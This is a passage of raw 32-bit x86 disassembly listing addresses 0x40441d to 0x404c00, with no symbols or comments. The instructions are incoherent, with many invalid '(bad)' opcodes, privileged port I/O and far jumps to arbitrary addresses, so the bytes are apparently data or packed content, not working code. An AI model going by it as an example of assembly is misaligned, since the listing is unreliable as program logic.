  40441d:	or     eax,0x8ee5436c
  404422:	imul   DWORD PTR [edi*2+0x2428f7a1]
  404429:	(bad)  
  40442a:	xor    ebx,DWORD PTR [edi+0xc994e1a]
  404430:	fnstsw WORD PTR ds:0x674f1ee1
  404436:	push   cs
  404437:	(bad)  
  404438:	loopne 0x404487
  40443a:	or     edi,DWORD PTR [edi+0x5b1a0933]
  404440:	jge    0x404426
  404442:	jle    0x404462
  404444:	test   dl,0xc7
  404447:	cdq    
  404448:	cmp    BYTE PTR [ecx+0x85b1c9c],0x2a
  40444f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404450:	sub    al,0x22
  404452:	addr16 popf 
  404454:	neg    BYTE PTR [eax]
  404456:	jbe    0x4044cf
  404458:	ins    DWORD PTR es:[edi],dx
  404459:	test   al,0xbd
  40445b:	sar    esi,1
  40445d:	xchg   BYTE PTR [ecx],dh
  40445f:	hlt    
  404460:	aas    
  404461:	mov    ah,0x67
  404463:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404464:	cmc    
  404465:	cmp    edx,ebx
  404467:	rcl    bl,1
  404469:	popf   
  40446a:	fbstp  TBYTE PTR [edi]
  40446c:	mul    DWORD PTR [edx+0x7b]
  40446f:	xchg   DWORD PTR [ecx+0x1e995157],esi
  404475:	je     0x404448
  404477:	out    dx,eax
  404478:	sbb    esi,DWORD PTR ds:[ebx-0x55]
  40447c:	mov    fs,WORD PTR [ecx]
  40447e:	lds    edi,FWORD PTR [edx-0x15feb38f]
  404484:	das    
  404485:	and    DWORD PTR [edx-0x1d189e15],eax
  40448b:	jge    0x404413
  40448d:	push   edi
  40448e:	fisub  DWORD PTR [eiz*4-0x27265aa3]
  404495:	lods   al,BYTE PTR ds:[esi]
  404496:	push   0x34
  404498:	jns    0x40443d
  40449a:	in     al,0xef
  40449c:	shr    DWORD PTR [ebx+eax*8-0x72184699],1
  4044a3:	or     al,0x1b
  4044a5:	inc    esp
  4044a6:	mov    esi,0xef0dd947
  4044ab:	call   0x9e23:0xa5d648de
  4044b2:	leave  
  4044b3:	jmp    0xc99d8e86
  4044b8:	mov    dl,0x4d
  4044ba:	popf   
  4044bb:	sti    
  4044bc:	out    dx,al
  4044bd:	inc    edx
  4044be:	inc    esi
  4044bf:	mov    ebx,DWORD PTR [ebx+0x17]
  4044c2:	(bad)  
  4044c4:	jbe    0x404494
  4044c6:	(bad)  [ecx]
  4044c8:	rcr    ecx,0x98
  4044cb:	or     bl,BYTE PTR [ebp+0x4064a6cf]
  4044d1:	imul   esp,DWORD PTR [edx-0xe454f6a],0xffffffe3
  4044d8:	fdiv   st,st(7)
  4044da:	mov    bl,0xc4
  4044dc:	stos   DWORD PTR es:[edi],eax
  4044dd:	pop    ecx
  4044de:	arpl   WORD PTR cs:[ecx],ax
  4044e1:	sbb    eax,0xcdf66ec6
  4044e6:	leave  
  4044e7:	shl    BYTE PTR [esi-0x1e14643b],0xe2
  4044ee:	mov    edx,0x7a298c46
  4044f3:	jne    0x4044df
  4044f5:	ret    
  4044f6:	in     eax,dx
  4044f7:	mov    bl,0xc9
  4044f9:	ss aad 0x27
  4044fc:	or     eax,0x4b976754
  404501:	cmp    dl,BYTE PTR [edi-0x7e30d368]
  404507:	sbb    BYTE PTR [ecx+0x52],0x78
  40450b:	jl     0x404570
  40450d:	imul   sp,WORD PTR [edx-0xc3d1795],0xf3a8
  404516:	mov    ebx,0x6c935f74
  40451b:	out    0xc7,eax
  40451d:	jmp    0x4044e9
  40451f:	push   0xfb091f7e
  404524:	jne    0x40452b
  404526:	gs (bad) 
  404528:	aam    0x4c
  40452a:	jae    0x404527
  40452c:	jle    0x4044e1
  40452e:	(bad)  
  40452f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404530:	sti    
  404531:	js     0x40458d
  404533:	mov    al,ds:0x989c053e
  404538:	add    edi,esp
  40453a:	mov    esp,0x1164f5ca
  40453f:	inc    edx
  404540:	pop    edx
  404541:	and    DWORD PTR [esi+0x14197875],ebp
  404547:	pop    ebx
  404548:	fcomp  DWORD PTR [ebx-0xe05d0ee]
  40454e:	dec    edx
  40454f:	popa   
  404550:	mov    ds:0xeb75cb7c,eax
  404555:	rcr    bh,1
  404557:	leave  
  404558:	pop    ecx
  404559:	ins    DWORD PTR es:[edi],dx
  40455a:	xor    ah,BYTE PTR [ecx-0x41]
  40455d:	mov    dh,0x55
  40455f:	add    esi,DWORD PTR [edx]
  404561:	push   es
  404562:	iret   
  404563:	inc    ecx
  404564:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404565:	or     eax,0xca05e717
  40456a:	pop    esi
  40456b:	and    eax,0x20158e2
  404570:	push   esp
  404571:	cwde   
  404572:	push   ss
  404573:	xchg   ebx,eax
  404574:	mov    esi,0x35b70d0f
  404579:	fdivr  QWORD PTR [edx+0x6d815a92]
  40457f:	push   0xffffffd9
  404581:	xchg   ecx,eax
  404582:	icebp  
  404583:	mov    eax,ds:0xf32aaf89
  404588:	mov    bl,BYTE PTR [ebp+0xe3b5fd7]
  40458e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40458f:	mov    dl,0xae
  404591:	js     0x40454d
  404593:	sbb    al,0xfd
  404595:	sub    DWORD PTR [ecx-0x3cb06c39],0x86b5b11c
  40459f:	push   cs
  4045a0:	lods   eax,DWORD PTR ds:[esi]
  4045a1:	call   0x1c5f:0xecebd2b5
  4045a8:	call   DWORD PTR [ebp-0x50ef90b9]
  4045ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045af:	das    
  4045b0:	scas   eax,DWORD PTR es:[edi]
  4045b1:	fprem  
  4045b3:	push   cs
  4045b4:	inc    edx
  4045b5:	xchg   ebx,eax
  4045b6:	xchg   ebx,eax
  4045b7:	lock xchg ebx,eax
  4045b9:	jg     0x404545
  4045bb:	cs push es
  4045bd:	pop    ss
  4045be:	ffree  st(0)
  4045c0:	xchg   ebp,eax
  4045c1:	neg    DWORD PTR [edx+edi*1]
  4045c4:	push   ds
  4045c5:	stos   DWORD PTR es:[edi],eax
  4045c6:	push   cs
  4045c7:	dec    ecx
  4045c8:	cmp    al,0x26
  4045ca:	or     BYTE PTR [edi+0x11e03b62],dl
  4045d0:	into   
  4045d1:	add    eax,DWORD PTR [edx]
  4045d3:	std    
  4045d4:	cmp    esp,esi
  4045d6:	nop
  4045d7:	jbe    0x4045b3
  4045d9:	jo     0x4045ef
  4045db:	out    dx,al
  4045dc:	cmp    cl,BYTE PTR [edi-0x1e280fde]
  4045e2:	xchg   esp,eax
  4045e3:	and    DWORD PTR [esi+esi*1+0x38],0xf483220d
  4045eb:	iret   
  4045ec:	inc    eax
  4045ed:	and    eax,0xafdbf6d2
  4045f2:	pusha  
  4045f3:	ss or  al,0x4d
  4045f6:	rcr    BYTE PTR [ecx+0x3c0e94de],1
  4045fc:	jmp    0xb97c:0x6c4d0ebd
  404603:	sub    DWORD PTR [ebp+0x5b],ebx
  404606:	fiadd  DWORD PTR [esi-0x7bc84e80]
  40460c:	inc    esp
  40460d:	sbb    ebp,0xffffff80
  404610:	adc    ebp,DWORD PTR [ecx+0x1adad940]
  404616:	mov    edx,0xcc82fa0d
  40461b:	xchg   ecx,eax
  40461c:	jge    0x404670
  40461e:	ret    
  40461f:	adc    al,0xe5
  404621:	pusha  
  404622:	cwde   
  404623:	neg    DWORD PTR [edi-0x5f]
  404626:	pusha  
  404627:	jl     0x4046a5
  404629:	fimul  WORD PTR [esi]
  40462b:	daa    
  40462c:	popf   
  40462d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40462e:	sahf   
  40462f:	test   al,0x32
  404631:	mov    ah,ch
  404633:	push   ebx
  404634:	gs dec ebx
  404636:	pushf  
  404637:	dec    esi
  404638:	ret    0xc736
  40463b:	stos   DWORD PTR es:[edi],eax
  40463c:	mov    dh,0x6
  40463e:	aas    
  40463f:	rep stos DWORD PTR es:[edi],eax
  404641:	icebp  
  404642:	imul   ebx,DWORD PTR [edx+0x5c],0x90e111b5
  404649:	(bad)  
  40464a:	sbb    edx,DWORD PTR [edi+0xb]
  40464d:	inc    edx
  40464e:	leave  
  40464f:	adc    BYTE PTR [edx],ch
  404651:	int3   
  404652:	mov    edx,0xc0a6711d
  404657:	out    dx,al
  404658:	arpl   si,bx
  40465a:	push   es
  40465b:	popa   
  40465c:	mov    ah,0x3f
  40465e:	or     cl,BYTE PTR [ecx]
  404660:	adc    BYTE PTR [eax-0x2d1b7e70],cl
  404666:	mov    edx,0x985f45b1
  40466b:	imul   edx,edx,0x6a35acc2
  404671:	cwde   
  404672:	or     al,0xc3
  404674:	cmp    BYTE PTR [ebp+0x1e],cl
  404677:	cli    
  404678:	dec    eax
  404679:	rsqrtps xmm6,XMMWORD PTR [ebx+0xe]
  40467d:	mov    dh,0xf2
  40467f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404680:	add    esp,DWORD PTR [ecx-0x4559d54d]
  404686:	jo     0x4046c8
  404688:	test   eax,0x3e633ec6
  40468d:	xor    edx,DWORD PTR [esi]
  40468f:	mov    DWORD PTR [edx+0x64],edx
  404692:	adc    al,0x6e
  404694:	or     dh,dl
  404696:	cmp    BYTE PTR [eax+0x79],bl
  404699:	cli    
  40469a:	and    ebx,esp
  40469c:	cli    
  40469d:	(bad)  
  40469e:	xlat   BYTE PTR ds:[ebx]
  40469f:	fisub  DWORD PTR [esi+0x379b2c1f]
  4046a5:	gs in  al,0x7
  4046a8:	js     0x40465d
  4046aa:	cmc    
  4046ab:	gs push cs
  4046ad:	scas   eax,DWORD PTR es:[edi]
  4046ae:	mov    esp,0xf6834501
  4046b3:	test   DWORD PTR [ebx],edx
  4046b5:	inc    ebx
  4046b6:	in     eax,0xe5
  4046b8:	iret   
  4046b9:	add    DWORD PTR [ecx],0x1e
  4046bc:	push   cs
  4046bd:	popf   
  4046be:	cdq    
  4046bf:	inc    edx
  4046c0:	xchg   ebp,eax
  4046c1:	sub    eax,DWORD PTR ds:0xc7d3ede5
  4046c7:	cmp    al,0xe6
  4046c9:	lock or ch,BYTE PTR [edi+0x712afc7f]
  4046d0:	jns    0x404691
  4046d2:	imul   ebp,DWORD PTR [edx+0x36],0x3328a6eb
  4046d9:	xchg   edx,eax
  4046da:	xchg   esp,eax
  4046db:	js     0x40471e
  4046dd:	ds fs push esi
  4046e0:	ins    BYTE PTR es:[edi],dx
  4046e1:	jg     0x404714
  4046e3:	lea    edx,[edx]
  4046e5:	inc    edi
  4046e6:	shr    DWORD PTR [esi+esi*1+0x1c26e33c],cl
  4046ed:	(bad)  
  4046ee:	repnz fild DWORD PTR [edi+0x57]
  4046f2:	outs   dx,DWORD PTR ds:[esi]
  4046f3:	jno    0x40474a
  4046f5:	or     DWORD PTR [ebx+eiz*4],esi
  4046f8:	(bad)  
  4046f9:	dec    edi
  4046fa:	daa    
  4046fb:	cwde   
  4046fc:	pop    esi
  4046fd:	aaa    
  4046fe:	cmp    al,0x98
  404700:	push   esi
  404701:	fstp   QWORD PTR [esi+0x2e]
  404704:	xlat   BYTE PTR ds:[ebx]
  404705:	sub    DWORD PTR [ecx+0x6b],eax
  404708:	retf   
  404709:	(bad)  
  40470a:	jnp    0x404701
  40470c:	push   esp
  40470d:	test   DWORD PTR [ecx],esp
  40470f:	loop   0x40470c
  404711:	mov    edx,0x93443ca2
  404716:	hlt    
  404717:	sbb    DWORD PTR [eax*2+0x23a9d457],esp
  40471e:	jp     0x404748
  404720:	sti    
  404721:	mov    BYTE PTR [ecx],dh
  404723:	ret    
  404724:	add    edi,DWORD PTR [ebx+0x5d]
  404727:	fnstsw WORD PTR [edi+0x6e]
  40472a:	adc    esi,DWORD PTR [edx+0x74538dfd]
  404730:	push   edi
  404731:	mov    ecx,0x9a3939a2
  404736:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404737:	dec    edi
  404738:	sub    DWORD PTR [ebp+0x214efccf],esp
  40473e:	xor    al,0xc4
  404740:	inc    esp
  404741:	outs   dx,BYTE PTR ds:[esi]
  404742:	and    al,0x20
  404744:	xor    BYTE PTR [edi+0x694b0ab],dh
  40474a:	sbb    eax,0x6485ab24
  40474f:	jb     0x404798
  404751:	call   0xccfa66ae
  404756:	aam    0x5
  404758:	call   0xedce1ee8
  40475d:	xchg   esp,eax
  40475e:	xchg   BYTE PTR [edx],dh
  404760:	jp     0x404706
  404762:	jmp    0x404720
  404764:	push   DWORD PTR [edi+0x63]
  404767:	cmc    
  404768:	mov    esi,0xbe636d12
  40476d:	mov    BYTE PTR [ebp+0x74429536],bh
  404773:	xchg   edx,eax
  404774:	xchg   ebp,eax
  404775:	mov    ds:0xdb786f0a,al
  40477a:	xchg   edi,eax
  40477b:	repnz pop edx
  40477e:	lods   al,BYTE PTR ds:[esi]
  40477f:	mov    bl,0xde
  404781:	jecxz  0x4047b1
  404783:	daa    
  404784:	enter  0x390d,0x43
  404788:	mov    eax,ds:0xc6cbf0fa
  40478d:	out    0x5a,eax
  40478f:	lods   al,BYTE PTR ds:[esi]
  404790:	mov    ah,0xff
  404792:	dec    edi
  404793:	daa    
  404794:	push   ebx
  404795:	mov    al,0xc6
  404797:	push   ss
  404798:	cwde   
  404799:	test   al,0xfd
  40479b:	and    esp,DWORD PTR [ebx-0x4bbd9106]
  4047a1:	es loope 0x404785
  4047a4:	push   ds
  4047a5:	call   0x9979ad6e
  4047aa:	lahf   
  4047ab:	dec    ebx
  4047ac:	(bad)  
  4047ad:	cmp    al,0x3
  4047af:	jecxz  0x40475f
  4047b1:	cmp    esi,DWORD PTR [ebx+0x21ec58cf]
  4047b7:	inc    eax
  4047b8:	mov    bl,0xd0
  4047ba:	call   0x7f9b:0x9146fcc5
  4047c1:	sbb    BYTE PTR [edx],dh
  4047c3:	jge    0x4047ab
  4047c5:	inc    esp
  4047c6:	adc    esp,DWORD PTR [edx-0x5011db8d]
  4047cc:	sub    eax,0xf167695f
  4047d1:	dec    edx
  4047d2:	push   es
  4047d3:	cwde   
  4047d4:	or     ecx,DWORD PTR [edx-0x5b9d187f]
  4047da:	mov    esi,0x1fd2098d
  4047df:	test   BYTE PTR [edi+0x52283284],dl
  4047e5:	ins    DWORD PTR es:[edi],dx
  4047e6:	jecxz  0x4047e0
  4047e8:	fsub   DWORD PTR [ebx-0x7fbc07b9]
  4047ee:	(bad)  
  4047ef:	icebp  
  4047f0:	and    DWORD PTR [edx+0x2e434e36],edx
  4047f6:	dec    esp
  4047f7:	in     eax,0x7a
  4047f9:	add    ch,dl
  4047fb:	dec    ebp
  4047fc:	jmp    FWORD PTR [edx]
  4047fe:	stos   BYTE PTR es:[edi],al
  4047ff:	sti    
  404800:	dec    ebp
  404801:	dec    esp
  404802:	push   ss
  404803:	jno    0x404798
  404805:	ja     0x404788
  404807:	mov    DWORD PTR [ebp+esi*2+0xa],ecx
  40480b:	sub    ebx,esp
  40480d:	push   ss
  40480e:	mov    edi,0x349086f1
  404813:	outs   dx,BYTE PTR ds:[esi]
  404814:	(bad)  
  404815:	in     al,dx
  404816:	call   0x838a:0x640526fc
  40481d:	loopne 0x404844
  40481f:	push   eax
  404820:	aad    0x46
  404822:	mov    ds:0x6761c887,eax
  404827:	je     0x4047ae
  404829:	test   DWORD PTR [ebx-0x1c],eax
  40482c:	gs dec ebx
  40482e:	jg     0x404834
  404830:	out    dx,al
  404831:	xchg   esp,eax
  404832:	in     al,dx
  404833:	push   edx
  404834:	lock mov ebx,DWORD PTR [esp+edi*1+0x21]
  404839:	adc    bh,cl
  40483b:	xor    BYTE PTR ds:0x95ea22fe,ah
  404841:	pop    ss
  404842:	pop    es
  404843:	(bad)  
  404844:	sub    eax,DWORD PTR [ebp-0x1978f7e8]
  40484a:	nop
  40484b:	sbb    DWORD PTR [edx+0xb2a1b4c],esi
  404851:	mov    ch,0xca
  404853:	mov    ecx,0xcd97c30f
  404858:	mov    ds:0x518df095,eax
  40485d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40485e:	sti    
  40485f:	pop    esi
  404860:	push   edi
  404861:	mov    ah,0xd0
  404863:	mov    BYTE PTR [ebx+ecx*2+0x17],ch
  404867:	mov    dl,0x6
  404869:	push   esi
  40486a:	pop    eax
  40486b:	(bad)  
  40486c:	(bad)  
  40486d:	adc    eax,0xe47a81f
  404872:	jno    0x40484d
  404874:	(bad)  
  404875:	jle    0x404834
  404877:	or     eax,0xe4e75768
  40487c:	sahf   
  40487d:	adc    DWORD PTR [edi],0x6151d5f9
  404883:	mov    dh,0x3f
  404885:	dec    eax
  404886:	stos   BYTE PTR es:[edi],al
  404887:	push   cs
  404888:	daa    
  404889:	xor    BYTE PTR [eax-0x2d],0x63
  40488d:	push   esi
  40488e:	jnp    0x40487f
  404890:	adc    dl,0x24
  404893:	add    BYTE PTR [ebx+0x4c2da741],ah
  404899:	pop    esi
  40489a:	sbb    eax,0x89c08f42
  40489f:	(bad)  
  4048a0:	ins    DWORD PTR es:[edi],dx
  4048a1:	xor    eax,0x3c68ceaf
  4048a6:	hlt    
  4048a7:	add    eax,0xf9cf91b1
  4048ac:	push   esi
  4048ad:	inc    ebx
  4048ae:	fcmovnbe st,st(7)
  4048b0:	scas   al,BYTE PTR es:[edi]
  4048b1:	test   DWORD PTR [esi-0x338ed481],ebp
  4048b7:	mov    edx,0x666cfbfd
  4048bc:	cmp    BYTE PTR [esi],cl
  4048be:	push   edi
  4048bf:	ins    BYTE PTR es:[edi],dx
  4048c0:	or     esi,edx
  4048c2:	fdivr  QWORD PTR [esi-0x1990af4c]
  4048c8:	lahf   
  4048c9:	lods   eax,DWORD PTR ds:[esi]
  4048ca:	sbb    dh,ch
  4048cc:	iret   
  4048cd:	adc    ebx,DWORD PTR [ebx]
  4048cf:	rcl    ebp,0x30
  4048d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048d3:	or     ch,BYTE PTR ds:0xe7b89d81
  4048d9:	outs   dx,DWORD PTR ds:[esi]
  4048da:	cs mov ebp,0xe0d4f863
  4048e0:	sbb    eax,0x36e70773
  4048e5:	inc    edi
  4048e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048e7:	in     eax,0xc9
  4048e9:	lods   al,BYTE PTR ds:[esi]
  4048ea:	adc    eax,0xc910d501
  4048ef:	mov    al,ds:0x479a1ec
  4048f4:	mov    eax,0x212ca5e1
  4048f9:	(bad)  
  4048fb:	xor    eax,ecx
  4048fd:	dec    ecx
  4048fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048ff:	gs das 
  404901:	cmc    
  404902:	fisttp QWORD PTR [ecx+0x36a7b585]
  404908:	push   ebp
  404909:	and    BYTE PTR [edx-0x59],bl
  40490c:	loop   0x40489b
  40490e:	add    BYTE PTR [eax],ah
  404910:	lods   al,BYTE PTR ds:[esi]
  404911:	aas    
  404912:	mov    ebx,0x6b3cc4fb
  404917:	add    eax,0xb0e8c801
  40491c:	shr    esp,0x97
  40491f:	(bad)  
  404920:	cld    
  404921:	out    0xfe,al
  404923:	dec    ebx
  404925:	cmp    ecx,ebp
  404927:	int3   
  404928:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404929:	fwait
  40492a:	xchg   BYTE PTR [ebx+0x72],bl
  40492d:	xlat   BYTE PTR ds:[ebx]
  40492e:	ret    0xab07
  404931:	or     dh,BYTE PTR [edx]
  404933:	cmc    
  404934:	jmp    0x6cd2:0x22acae55
  40493b:	jbe    0x4049a2
  40493d:	outs   dx,DWORD PTR ds:[esi]
  40493e:	js     0x404910
  404940:	push   ebp
  404941:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404942:	pop    ebp
  404943:	and    DWORD PTR es:[edx-0xad9f235],edi
  40494a:	dec    esp
  40494b:	test   DWORD PTR [edx-0x18],0x513aa2c1
  404952:	fcomi  st,st(5)
  404954:	dec    ebp
  404955:	add    eax,0xd44aa7f6
  40495a:	and    BYTE PTR [esi],bl
  40495c:	mov    ebp,0x688ecaea
  404961:	or     DWORD PTR [ecx-0x40],0xad129f4d
  404968:	stos   BYTE PTR es:[edi],al
  404969:	xchg   ebx,eax
  40496a:	int    0xc3
  40496c:	mov    al,0x10
  40496e:	inc    edi
  40496f:	xchg   esp,eax
  404970:	ss xchg ecx,eax
  404972:	ss dec ebx
  404974:	retf   0x864f
  404977:	mov    ah,0x37
  404979:	pop    eax
  40497a:	pop    ds
  40497b:	adc    DWORD PTR [ebx+0x7c],ebp
  40497e:	mov    ds:0xa206686f,eax
  404983:	shl    edx,cl
  404985:	cmp    bl,BYTE PTR [eax]
  404987:	jecxz  0x4049d9
  404989:	add    BYTE PTR [ebx+ebp*1-0x58dd3559],cl
  404990:	rol    esi,0x5b
  404993:	dec    ecx
  404994:	das    
  404995:	(bad)  
  404996:	(bad)  
  404997:	outs   dx,BYTE PTR ds:[esi]
  404998:	adc    ah,ah
  40499a:	rcr    BYTE PTR [eax-0x18d77346],cl
  4049a0:	rcr    BYTE PTR [esi],cl
  4049a2:	sbb    BYTE PTR [ecx+0x4d],0xeb
  4049a6:	or     BYTE PTR [edi-0x75],0x17
  4049aa:	pop    edx
  4049ab:	fidivr WORD PTR [esi+0x2f]
  4049ae:	lea    ecx,[esi-0xe]
  4049b1:	sub    bl,BYTE PTR [esi-0xc]
  4049b4:	jg     0x404998
  4049b6:	ds xchg edi,eax
  4049b8:	dec    ecx
  4049b9:	inc    ecx
  4049ba:	push   esi
  4049bb:	mov    ds:0xab65bdb7,al
  4049c0:	nop
  4049c1:	mov    BYTE PTR [ebx],dl
  4049c3:	int    0xf2
  4049c5:	inc    esi
  4049c6:	jmp    0xe0f79ddd
  4049cb:	fdiv   st(2),st
  4049cd:	inc    esi
  4049ce:	pop    ebx
  4049cf:	stos   BYTE PTR es:[edi],al
  4049d0:	adc    al,0xc6
  4049d2:	xchg   edx,eax
  4049d3:	and    edi,esi
  4049d5:	loopne 0x4049eb
  4049d7:	or     dh,BYTE PTR [eax]
  4049d9:	pop    esi
  4049da:	mov    eax,ds:0x4cc17c6f
  4049df:	daa    
  4049e0:	in     al,dx
  4049e1:	mul    bl
  4049e3:	push   ebp
  4049e4:	(bad)  
  4049e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049e6:	rol    DWORD PTR [ecx-0x1768f161],cl
  4049ec:	call   0x435bed30
  4049f1:	and    DWORD PTR [eax-0x600234e3],0xbcf49b6d
  4049fb:	enter  0xa882,0x8e
  4049ff:	sub    eax,0xb5c90088
  404a04:	push   0xc7263687
  404a09:	pop    esi
  404a0a:	dec    eax
  404a0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a0c:	pop    esi
  404a0d:	fnstcw WORD PTR [eax]
  404a0f:	push   ss
  404a10:	mov    eax,ds:0xf3ab9688
  404a15:	sub    ch,bh
  404a17:	xor    edx,DWORD PTR [edx]
  404a19:	jg     0x4049f6
  404a1b:	sbb    al,0xf8
  404a1d:	arpl   WORD PTR [edi+0x5768f4c7],bp
  404a23:	sbb    bh,bh
  404a25:	push   ebp
  404a26:	ror    BYTE PTR [eax],0xac
  404a29:	dec    edi
  404a2a:	add    eax,0x9d2a7d8c
  404a2f:	je     0x404a9c
  404a31:	adc    eax,0x3eb33ac6
  404a36:	xor    DWORD PTR [ecx-0x3],ecx
  404a39:	cdq    
  404a3a:	test   BYTE PTR [esi],al
  404a3c:	test   DWORD PTR [esi],0x89489a86
  404a42:	int3   
  404a43:	jne    0x404a4a
  404a45:	pop    ds
  404a46:	(bad)  
  404a47:	mov    ds:0xefcce892,al
  404a4c:	mov    eax,esp
  404a4e:	xchg   edi,eax
  404a4f:	in     eax,dx
  404a50:	fidiv  DWORD PTR ds:0x7e96c205
  404a57:	push   edi
  404a58:	call   0xdd4a123
  404a5d:	adc    cl,dl
  404a5f:	leave  
  404a60:	nop
  404a61:	mov    esi,0x54853ec1
  404a66:	adc    DWORD PTR ds:0x9cc269ae,ebx
  404a6c:	sar    BYTE PTR [ecx+eax*8-0x77],1
  404a70:	lds    eax,FWORD PTR [edx+0x39]
  404a73:	lods   al,BYTE PTR ds:[esi]
  404a74:	jmp    0xab817f1b
  404a79:	out    dx,al
  404a7a:	inc    ebx
  404a7b:	xor    bl,BYTE PTR ds:0xb9a6ca08
  404a81:	mov    ds:0x230a51e0,al
  404a86:	lahf   
  404a87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a88:	mov    al,dh
  404a8a:	inc    ebp
  404a8b:	add    BYTE PTR [ecx+0x32ad752d],al
  404a91:	jmp    0xcf4c:0xfb13cb5a
  404a98:	and    BYTE PTR [ebp+0x662e4848],ch
  404a9e:	lods   eax,DWORD PTR ds:[esi]
  404a9f:	adc    ch,BYTE PTR [edi]
  404aa1:	in     eax,0x77
  404aa3:	lods   al,BYTE PTR ds:[esi]
  404aa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404aa5:	mov    edx,0x9b740f6f
  404aaa:	push   es
  404aab:	mov    esi,0x4228cf6a
  404ab0:	(bad)  
  404ab1:	push   edi
  404ab2:	cmp    edx,ecx
  404ab4:	and    bl,bh
  404ab6:	daa    
  404ab7:	cmp    BYTE PTR ds:0xaed6b1e6,0xb8
  404abe:	xchg   edx,eax
  404abf:	cdq    
  404ac0:	shl    ecx,cl
  404ac2:	pushf  
  404ac3:	sub    eax,0xf36c359c
  404ac8:	stos   BYTE PTR es:[edi],al
  404ac9:	in     al,0xaf
  404acb:	sub    bh,BYTE PTR [ebp+0x7b2c2cc2]
  404ad1:	pusha  
  404ad2:	mov    dh,0xd6
  404ad4:	mov    edi,DWORD PTR [edx-0x3b]
  404ad7:	pusha  
  404ad8:	dec    ecx
  404ad9:	call   0x3d2b73d9
  404ade:	ds xchg edx,eax
  404ae0:	aaa    
  404ae1:	enter  0x6d8c,0xe8
  404ae5:	mov    bl,0xc5
  404ae7:	fsub   st(4),st
  404ae9:	cmp    edx,DWORD PTR [edi]
  404aeb:	mov    ds:0x47d9d2bd,eax
  404af0:	jle    0x404b04
  404af2:	inc    ecx
  404af3:	mov    ebp,0x5583c477
  404af8:	fidiv  DWORD PTR [eax-0x2d]
  404afb:	imul   edi,eax,0x657aa4ed
  404b01:	cs xchg ecx,eax
  404b03:	aaa    
  404b04:	out    dx,al
  404b05:	mov    WORD PTR [esi-0x3ca72023],ds
  404b0b:	retf   0x7dc2
  404b0e:	and    DWORD PTR [edi+0x7],ebp
  404b11:	rcl    BYTE PTR [ebp+0x686ecba4],cl
  404b17:	std    
  404b18:	jmp    0x4cfded3c
  404b1d:	std    
  404b1e:	and    eax,0xf22b8dcd
  404b23:	mov    ebx,0xb7561388
  404b28:	imul   BYTE PTR [ecx-0x5fddacb2]
  404b2e:	pop    ecx
  404b2f:	shl    DWORD PTR [ebx-0x3ca22dac],cl
  404b35:	lods   al,BYTE PTR ds:[esi]
  404b36:	ret    0x7000
  404b39:	pop    ebx
  404b3a:	das    
  404b3b:	test   eax,0x5c75b9ba
  404b40:	shl    DWORD PTR [edx+0x4902ccdb],1
  404b46:	inc    ebx
  404b47:	or     BYTE PTR [edx+0x1cbafb74],ah
  404b4d:	jecxz  0x404bab
  404b4f:	pop    ebp
  404b50:	nop
  404b51:	push   edx
  404b52:	inc    esp
  404b53:	adc    ebp,DWORD PTR [ebx]
  404b55:	xor    al,0xed
  404b57:	fiadd  DWORD PTR [edx+ebx*2]
  404b5a:	leave  
  404b5b:	mov    edx,0xbcb47732
  404b60:	mov    edi,ebp
  404b62:	pop    esi
  404b63:	mov    ds:0x469cff43,al
  404b68:	rol    DWORD PTR [ebp+0x3b],1
  404b6b:	cwde   
  404b6c:	add    eax,0x830c29b0
  404b71:	pop    ecx
  404b72:	cmp    eax,0x6196ad71
  404b77:	xor    esp,DWORD PTR [esi-0x2e877424]
  404b7d:	bnd js 0x404b79
  404b80:	stos   DWORD PTR es:[edi],eax
  404b81:	repz mov al,ds:0x27bcc4a3
  404b87:	sbb    dl,BYTE PTR [esi+esi*2+0x660ab3be]
  404b8e:	add    ebp,DWORD PTR ds:0x7810e492
  404b94:	xor    DWORD PTR [esi+edx*8],edx
  404b97:	setg   BYTE PTR [edx+ecx*4+0x2559b530]
  404b9f:	push   ebp
  404ba0:	mov    ecx,0xf6ebe3a4
  404ba5:	(bad)  
  404ba6:	loopne 0x404b31
  404ba8:	(bad)  [ecx+0x480e9102]
  404bae:	inc    esi
  404baf:	shr    BYTE PTR [ebp+0x3e],1
  404bb2:	xlat   BYTE PTR ds:[ebx]
  404bb3:	repnz adc al,0x50
  404bb6:	and    ah,cl
  404bb8:	and    edi,eax
  404bba:	clc    
  404bbb:	adc    eax,0x8a399db5
  404bc0:	stc    
  404bc1:	out    0xac,eax
  404bc3:	jbe    0x404b7e
  404bc5:	sub    cl,al
  404bc7:	mov    WORD PTR [esi],gs
  404bc9:	mov    bl,0x31
  404bcb:	iret   
  404bcc:	mov    edi,0x6feb9a5b
  404bd1:	mov    al,ds:0xc4963751
  404bd6:	xchg   esi,eax
  404bd7:	sub    DWORD PTR [edi+esi*8+0x1b],esi
  404bdb:	nop
  404bdc:	leave  
  404bdd:	pusha  
  404bde:	mov    bl,BYTE PTR [ebx]
  404be0:	push   edx
  404be1:	jmp    0xd38d70d6
  404be6:	out    0x33,eax
  404be8:	sbb    eax,edi
  404bea:	popf   
  404beb:	inc    edi
  404bec:	cmp    BYTE PTR [ebx-0x1bf48ec3],ah
  404bf2:	cmp    al,0x36
  404bf4:	jg     0x404bbc
  404bf6:	(bad)  
  404bf7:	imul   ecx,DWORD PTR ds:0x7b510aa2,0x78
  404bfe:	jnp    0x404b93
  404c00:	mov    esi,0x14a88fa1
